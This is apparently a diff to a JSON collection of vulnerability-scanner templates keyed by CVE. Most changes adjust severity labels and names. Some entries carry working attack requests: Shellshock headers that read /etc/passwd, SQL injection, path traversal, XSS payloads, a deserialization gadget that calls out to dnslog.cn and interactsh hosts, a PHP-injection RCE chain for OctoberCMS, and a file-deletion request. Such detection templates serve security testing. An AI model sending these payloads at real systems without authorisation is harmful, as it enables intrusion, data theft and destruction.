@@ -2087,7 +2087,7 @@
       "id": "CVE-2010-4239",
       "info": {
         "name": "Tiki Wiki CMS Groupware 5.2 - Local File Inclusion",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -3311,9 +3311,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5817,8 +5817,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html",
-            "{{BaseURL}}/api/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html"
+            "{{BaseURL}}/api/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html",
+            "{{BaseURL}}/jolokia/read<svg%20onload=alert(document.domain)>?mimeType=text/html"
           ]
         }
       ]
@@ -6424,7 +6424,7 @@
       "id": "CVE-2018-14912",
       "info": {
         "name": "cgit < 1.2.1 Directory Traversal",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -6454,7 +6454,7 @@
       "id": "CVE-2018-14931",
       "info": {
         "name": "Polarisft Intellect Core Banking Software Version 9.7.1 - Open Redirect",
-        "severity": "low"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -6710,7 +6710,7 @@
       "id": "CVE-2018-16716",
       "info": {
         "name": "NCBI ToolBox - Directory Traversal",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -6775,6 +6775,22 @@
         {
           "raw": [
             "GET /plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=\"%20UNION%20SELECT%20NULL,NULL,CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION(),0x6e75636c65692d74656d706c617465),NULL,NULL,NULL,NULL,NULL--%20aa HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-17422",
+      "info": {
+        "name": "dotCMS < 5.0.2 - Open Redirect",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/html/common/forward_js.jsp?FORWARD_URL=http://www.example.com",
+            "{{BaseURL}}/html/portlet/ext/common/page_preview_popup.jsp?hostname=example.com"
           ]
         }
       ]
@@ -7160,7 +7176,7 @@
       "id": "CVE-2018-3238",
       "info": {
         "name": "Oracle Fusion Middleware WebCenter Sites 11.1.1.8.0 - Cross-Site Scripting",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -7306,7 +7322,7 @@
       "id": "CVE-2018-6910",
       "info": {
         "name": "DedeCMS 5.7 path disclosure",
-        "severity": "medium"
+        "severity": "high"
       },
       "requests": [
         {
@@ -7589,7 +7605,7 @@
     {
       "id": "CVE-2018-9845",
       "info": {
-        "name": "Etherpad Lite before 1.6.4 is exploitable for admin access.",
+        "name": "Etherpad Lite <1.6.4 - Admin Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -7604,7 +7620,7 @@
     {
       "id": "CVE-2018-9995",
       "info": {
-        "name": "DVR Authentication Bypass",
+        "name": "TBK DVR4104/DVR4216 Devices - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -7650,7 +7666,7 @@
     {
       "id": "CVE-2019-0230",
       "info": {
-        "name": "Apache Struts RCE",
+        "name": "Apache Struts <=2.5.20 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8020,7 +8036,7 @@
       "id": "CVE-2019-13396",
       "info": {
         "name": "FlightPath Local File Inclusion",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -8386,7 +8402,7 @@
     {
       "id": "CVE-2019-16920",
       "info": {
-        "name": "Unauthenticated Multiple D-Link Routers RCE",
+        "name": "D-Link Routers - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -8431,7 +8447,7 @@
     {
       "id": "CVE-2019-17270",
       "info": {
-        "name": "Yachtcontrol Webapplication 1.0 - Unauthenticated Rce",
+        "name": "Yachtcontrol Webapplication 1.0 - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -8446,13 +8462,13 @@
     {
       "id": "CVE-2019-17382",
       "info": {
-        "name": "Zabbix Authentication Bypass",
+        "name": "Zabbix <=4.4 - Authentication Bypass",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
-            "GET /zabbix.php?action=dashboard.view&dashboardid={{ids}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Language: en-US,en;q=0.9\n"
+            "GET /zabbix.php?action=dashboard.view&dashboardid={{ids}} HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -8475,7 +8491,7 @@
     {
       "id": "CVE-2019-17444",
       "info": {
-        "name": "Jfrog Artifactory default password",
+        "name": "Jfrog Artifactory <6.17.0 - Default Admin Password",
         "severity": "critical"
       },
       "requests": [
@@ -8505,7 +8521,7 @@
     {
       "id": "CVE-2019-17506",
       "info": {
-        "name": "D-Link DIR-868L & DIR-817LW - Information Disclosure",
+        "name": "D-Link DIR-868L/817LW - Information Disclosure",
         "severity": "critical"
       },
       "requests": [
@@ -9444,7 +9460,7 @@
     {
       "id": "CVE-2020-10148",
       "info": {
-        "name": "SolarWinds Orion API Auth Bypass Leads to RCE (SUPERNOVA)",
+        "name": "SolarWinds Orion API - Auth Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -9625,7 +9641,7 @@
     {
       "id": "CVE-2020-11710",
       "info": {
-        "name": "Kong Admin Rest API Unauth",
+        "name": "Kong Admin <=2.03 - Admin API Access",
         "severity": "critical"
       },
       "requests": [
@@ -9671,7 +9687,7 @@
     {
       "id": "CVE-2020-11854",
       "info": {
-        "name": "Micro Focus UCMDB RCE",
+        "name": "Micro Focus UCMDB - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9796,7 +9812,7 @@
     {
       "id": "CVE-2020-12800",
       "info": {
-        "name": "WordPress 'Drag & Drop Multiple File Upload - Contact Form 7' Plugin - Pre-auth RCE",
+        "name": "WordPress Contact Form 7 <1.3.3.3 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -9811,7 +9827,7 @@
     {
       "id": "CVE-2020-13117",
       "info": {
-        "name": "Wavlink Multiple AP - Unauthenticated RCE",
+        "name": "Wavlink Multiple AP - Remote Command Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9840,7 +9856,7 @@
     {
       "id": "CVE-2020-13167",
       "info": {
-        "name": "Netsweeper WebAdmin unixlogin.php Python Code Injection",
+        "name": "Netsweeper <=6.4.3 - Python Code Injection",
         "severity": "critical"
       },
       "requests": [
@@ -9890,7 +9906,7 @@
     {
       "id": "CVE-2020-13927",
       "info": {
-        "name": "Unauthenticated Airflow Experimental REST API",
+        "name": "Airflow Experimental <1.10.11 - REST API Auth Bypass",
         "severity": "critical"
       },
       "requests": [
@@ -9923,7 +9939,7 @@
     {
       "id": "CVE-2020-13942",
       "info": {
-        "name": "Apache Unomi Remote Code Execution",
+        "name": "Apache Unomi <1.5.2 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10169,7 +10185,7 @@
     {
       "id": "CVE-2020-15920",
       "info": {
-        "name": "Unauthenticated RCE at Mida eFramework on 'PDC/ajaxreq.php'",
+        "name": "Mida eFramework <=2.9.0 - Remote Command Execution",
         "severity": "critical"
       },
       "requests": [
@@ -10590,7 +10606,7 @@
       "id": "CVE-2020-22210",
       "info": {
         "name": "74cms Sql Injection",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -11290,7 +11306,7 @@
     {
       "id": "CVE-2020-29227",
       "info": {
-        "name": "Car Rental Management System 1.0 - Local File Inclusion (LFI)",
+        "name": "Car Rental Management System 1.0 - Local File Inclusion",
         "severity": "critical"
       },
       "requests": [
@@ -12451,7 +12467,7 @@
       "id": "CVE-2020-9757",
       "info": {
         "name": "Craft CMS < 3.3.0 - Server-Side Template Injection",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -12658,7 +12674,7 @@
       "id": "CVE-2021-20167",
       "info": {
         "name": "Netgear RAX43 1.0.3.96 - Command Injection/Authentication Bypass Buffer Overrun",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -13582,7 +13598,7 @@
     {
       "id": "CVE-2021-24499",
       "info": {
-        "name": "Workreap WordPress theme - unauthenticated RCE",
+        "name": "WordPress Workreap - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -13643,7 +13659,7 @@
     {
       "id": "CVE-2021-24762",
       "info": {
-        "name": "Perfect Survey WordPress plugin before 1.5.2 SQLI",
+        "name": "WordPress Perfect Survey<1.5.2 - SQL Injection",
         "severity": "critical"
       },
       "requests": [
@@ -13689,7 +13705,7 @@
       "id": "CVE-2021-24947",
       "info": {
         "name": "WordPress Responsive Vector Maps < 6.4.2 - Arbitrary File Read",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -13778,7 +13794,7 @@
       "id": "noptin-open-redirect",
       "info": {
         "name": "Noptin < 1.6.5 - Open Redirect",
-        "severity": "low"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -14030,13 +14046,13 @@
     {
       "id": "CVE-2021-26295",
       "info": {
-        "name": "Apache OFBiz RMI deserializes Arbitrary Code Execution",
+        "name": "Apache OFBiz RMI Deserialization - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
         {
           "raw": [
-            "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<soapenv:Envelope\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header/>\n    <soapenv:Body>\n        <ser>\n            <map-HashMap>\n                <map-Entry>\n                    <map-Key>\n                        <cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>\n                    </map-Key>\n                    <map-Value>\n                        <std-String value=\"http://t53lq9.dnslog.cn/\"></std-String>\n                    </map-Value>\n                </map-Entry>\n            </map-HashMap>\n        </ser>\n    </soapenv:Body>\n</soapenv:Envelope>\n"
+            "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<?xml version='1.0' encoding='UTF-8'?>\n<soapenv:Envelope\n  xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soapenv:Header/>\n    <soapenv:Body>\n      <ns1:clearAllEntityCaches xmlns:ns1=\"http://ofbiz.apache.org/service/\">\n          <ns1:cus-obj>{{generate_java_gadget(\"dns\", \"https://{{interactsh-url}}\", \"hex\")}}</ns1:cus-obj>\n      </ns1:clearAllEntityCaches>\n    </soapenv:Body>\n</soapenv:Envelope>\n"
           ]
         }
       ]
@@ -14082,21 +14098,6 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/r2w/signIn.do?urll=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
-          ]
-        }
-      ]
-    },
-    {
-      "id": "CVE-2021-26722",
-      "info": {
-        "name": "LinkedIn Oncall 1.4.0 XSS",
-        "severity": "medium"
-      },
-      "requests": [
-        {
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all"
           ]
         }
       ]
@@ -14185,7 +14186,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/calendar_form.php/\"><script>alert(document.domain)</script>"
+            "{{BaseURL}}/calendar/calendar_form.php/\"><script>alert(document.domain)</script>"
           ]
         }
       ]
@@ -14374,7 +14375,7 @@
       "id": "CVE-2021-28377",
       "info": {
         "name": "ChronoForums 2.0.11 - Directory Traversal",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -15355,7 +15356,7 @@
       "id": "CVE-2021-3577",
       "info": {
         "name": "Motorola Baby Monitors - Remote Command Execution",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -15660,7 +15661,7 @@
       "id": "CVE-2021-39226",
       "info": {
         "name": "Grafana Snapshot - Authentication Bypass",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -15916,7 +15917,7 @@
       "id": "CVE-2021-40875",
       "info": {
         "name": "Gurock TestRail Application files.md5 Exposure",
-        "severity": "medium"
+        "severity": "high"
       },
       "requests": [
         {
@@ -16007,7 +16008,7 @@
       "id": "CVE-2021-41277",
       "info": {
         "name": "Metabase Local File Inclusion",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -16081,7 +16082,7 @@
       "id": "CVE-2021-41381",
       "info": {
         "name": "Payara Micro Community 5.2021.6 Directory Traversal",
-        "severity": "medium"
+        "severity": "high"
       },
       "requests": [
         {
@@ -16397,7 +16398,7 @@
       "id": "CVE-2021-43287",
       "info": {
         "name": "Pre-Auth Takeover of Build Pipelines in GoCD",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -16442,7 +16443,7 @@
       "id": "CVE-2021-43778",
       "info": {
         "name": "GLPI plugin Barcode < 2.6.1 Path Traversal Vulnerability.",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -16552,7 +16553,7 @@
       "id": "CVE-2021-44451",
       "info": {
         "name": "Apache Superset Default Login",
-        "severity": "high"
+        "severity": "medium"
       },
       "requests": [
         {
@@ -16710,7 +16711,7 @@
       "id": "CVE-2021-45967",
       "info": {
         "name": "Pascom CPS Server-Side Request Forgery",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -16795,6 +16796,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/cgi-bin/tsaupload.cgi?file_name=../../../../../..//etc/passwd&password="
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-46424",
+      "info": {
+        "name": "TLR-2005KSH - Arbitrary File Delete",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /images/icons_title.gif HTTP/1.1\nHost: {{Hostname}}\n",
+            "DELETE /images/icons_title.gif HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /images/icons_title.gif HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -17151,7 +17168,7 @@
       "id": "CVE-2022-1020",
       "info": {
         "name": "Woo Product Table < 3.1.2 - Unauthenticated Arbitrary Function Call",
-        "severity": "high"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -17271,6 +17288,21 @@
       ]
     },
     {
+      "id": "CVE-2022-1598",
+      "info": {
+        "name": "WPQA < 5.4 - Reflected Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\nContent-Type: application/x-www-form-urlencoded\n\nuser_name={{user}}&email={{user}}@{{Host}}&pass1={{pass}}&pass2={{pass}}&phone={{rand_text_numeric(10)}}&agree_terms=on&form_type=wpqa-signup&action=wpqa_ajax_signup_process\n",
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0\nContent-Type: application/x-www-form-urlencoded\n\nuser_mail={{user}}@{{Host}}&form_type=wpqa_forget&action=wpqa_ajax_password_process&redirect_to={{url_encode(redirect_to)}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-21371",
       "info": {
         "name": "Oracle WebLogic Server Local File Inclusion",
@@ -17281,6 +17313,24 @@
           "method": "GET",
           "raw": [
             "GET {{path}} HTTP/1.1\nHost: {{Hostname}}\n\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-21705",
+      "info": {
+        "name": "OctoberCMS Authenticated Remote Code Execution",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /backend/backend/auth/signin HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /backend/backend/auth/signin HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n_session_key={{session_key}}&_token={{token}}&postback=1&login={{username}}&password={{password}}\n",
+            "POST /backend/cms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-OCTOBER-REQUEST-HANDLER: onSave\nX-OCTOBER-REQUEST-PARTIALS:\nX-Requested-With: XMLHttpRequest\n\n_session_key={{session_key}}&_token={{token}}&settings%5Btitle%5D={{randstr}}&settings%5Burl%5D=%2F{{randstr}}&fileName={{randstr}}&settings%5Blayout%5D=&settings%5Bdescription%5D=&settings%5Bis_hidden%5D=0&settings%5Bmeta_title%5D=&settings%5Bmeta_description%5D=&markup=%3C%3Fphp%0D%0A%0D%0Afunction+onInit()+%7B%0D%0A++++phpinfo()%3B%0D%0A%7D%0D%0A%0D%0A%3F%3E%0D%0A%3D%3D%0D%0A&code=&templateType=page&templatePath=&theme=demo&templateMtime=&templateForceSave=0\n",
+            "POST /backend/cms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-OCTOBER-REQUEST-HANDLER: onCreateTemplate\nX-OCTOBER-REQUEST-PARTIALS:\nX-Requested-With: XMLHttpRequest\n\n_session_key={{session_key}}&_token={{token}}&search=&type=page\n",
+            "POST /backend/cms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-OCTOBER-REQUEST-HANDLER: onOpenTemplate\nX-OCTOBER-REQUEST-PARTIALS:\nX-Requested-With: XMLHttpRequest\n\n_session_key={{session_key}}&_token={{token}}&search=&{{theme}}=demo&type=page&path={{randstr}}.htm\n"
           ]
         }
       ]
@@ -17462,8 +17512,8 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>",
-            "{{BaseURL}}/phpmyadmin/setup/index.php?page=servers&mode=test&id=\">'><script>alert(document.domain)</script>"
+            "{{BaseURL}}/phpmyadmin/setup/index.php?page=servers&mode=test&id=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/setup/index.php?page=servers&mode=test&id=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -17486,7 +17536,7 @@
       "id": "CVE-2022-23944",
       "info": {
         "name": "Apache ShenYu Admin Unauth Access",
-        "severity": "medium"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -17545,7 +17595,7 @@
       "id": "CVE-2022-24288",
       "info": {
         "name": "Apache Airflow OS Command Injection",
-        "severity": "critical"
+        "severity": "high"
       },
       "requests": [
         {
@@ -17700,7 +17750,7 @@
       "id": "CVE-2022-27849",
       "info": {
         "name": "WordPress Simple Ajax Chat plugin <= 20220115 - Sensitive Information Disclosure vulnerability",
-        "severity": "medium"
+        "severity": "high"
       },
       "requests": [
         {
